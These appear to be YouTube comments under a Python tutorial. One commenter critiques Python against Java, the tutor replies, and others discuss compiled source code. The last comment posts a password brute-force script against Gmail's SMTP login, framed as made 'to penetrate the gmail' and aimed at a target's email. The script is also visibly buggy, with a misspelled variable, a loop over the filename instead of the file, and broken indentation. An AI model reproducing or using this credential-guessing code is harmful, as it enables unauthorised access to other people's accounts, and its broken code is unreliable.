8:58 print('First Item', grocery_list[0]) Okay, now I'm confused ? Maybe I was looking at the source code for a different version of Python than the one you're using ? No string concatenation here. Just a list of parameters ? I see now that your IDE says the print declaration is an array of objects.

11:30 del grocery_list[4] VERSE grocery_list.remove("Pickle") 
14:43 del super_villians['Fiddler']
14:21 super_villians = {"Fiddler" : "Issac Bowin"}
14:59 super_villians['Pied Piper'] = 'Hartley Rathaway'

Python seems schizophrenic: Sometimes it's using the methods of an object (the object oriented approach) and other times it's using an outside function or keyword to act on an object. Sure, it's perfectly fine to use a function to act on an object sometimes. But I'm not sure I can agree that this is a good beginner language because of the inconsistencies, and the use of symbols to represent real objects. Symbols are nice shortcuts for experienced programmers, but i believe they're doing a dis-service to people learning OOP.  If someone doesn't understand object-oriented programming, then i would recommend Java or C# because they have so many objects to use... And after a while of using well designed objects (like Collections, List, Set, Map), OO will start to "click" and you'll "get it."

Compare the above python to java:
Map<String, String> super_villians = new HashMap<String, String>();
super_villians.put("Fiddler", "Issac Bowin");
super_villians.remove("Fiddler");
super_villians.put("Pied Piper", "Thomas Peterson");
super_villians.put("Pied Piper", "Hartley Rathaway");
super_villians.size()

17:38 The logical operators and, or,  not: This is a cool language feature to have these as keywords instead of symbols.

20:02 for x in range(0, 10)
I didn't see an example of a backwards for-loop, but stackoverflow has several different ways.

33:22 def set_name(self, name):
self is an interesting concept, but it's totally un-necessary to implement a language in this way. Also, i noticed that even tho methods declare self as a parameter, that you're not required to pass it as an argument (i'm guessing it gets passed automatically).

40:49
What about:
def play_sound(self):
    play_sound(self, 1)

def play_sound(self, how_many):
    print(self.get_sound() * how_many)

41:43 def get_type(self, animal)
"And it is going to receive Animal objects."
How does it only take animal objects ? No type is specified. Couldn't you pass it any object that had a method get_type() ?

in a strongly typed language, it's easy to see what type of objects are passed into functions & methods (the types are part of the method declaration). I'm struggling to see how you know what type of object to pass into a method without looking at the implementation details ?

42:22
test_animals = AnimalTesting()
There's no view ? No virtual ? No interface ? No abstract class ?Ôªø

author: Chris Goomba

text: +Chris Goomba The best way to learn is to pause your way through this video. Get the code in the description and as you pause take notes in your own way. Then type out or copy and paste the code to see the results and then experiment by writing your own programs. Un-pause the video rinse and repeat. This is like one of the normal tutorials that take 25 videos all condensed into one. You don't need to watch it all at once.I have time stamps in the description so you can easily jump back to where you left off. Also feel free to ask me questions. I answer all the questions I get.Ôªø

text:
This is no exactly related to the video itself, but I hope I can find someone here who'll answer my question:
Why can't we get the source code of a program that is installed in our PC? The program had to be written in some language. If the program works fine on the computer, so the computer knows the instructions it should follow to run the program properly. Isn't this instructions the source code itself?Ôªø
author: MeChameDoQueQuiser

text: +MeChameDoQueQuiser Because many programmers don't want you to have access to the source code. The program you normally receive is compiled and isn't readable like you see here.Ôªø
author: Derek Banas

text: But isn't there any way to read it? The computer can "read" it, the source of this "reading" must be somewhere. Maybe it's not a script like python, c++, etc., but isn't there any way to "decode" the language which the computer is using to understand the program?Ôªø

Possible solution to this script
Just created to penetrate the gmail
Created on the Kali Linux system .


import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()

smtpserver.starttls()



user = raw_input("Enter the target's email : ")

passwfile = raw_input("Enter the password File : ")

password = open(passwfile, "r")


for password in passwfile :
 
        try :

               smtpsserver.login(user, password)

         
               print ("[+] Password Found ==>  %s ") % password
               break;


         except smtplib.SMTPAuthenticationError:
                 print ("[!] Password is incorrect ==> %s ") % password
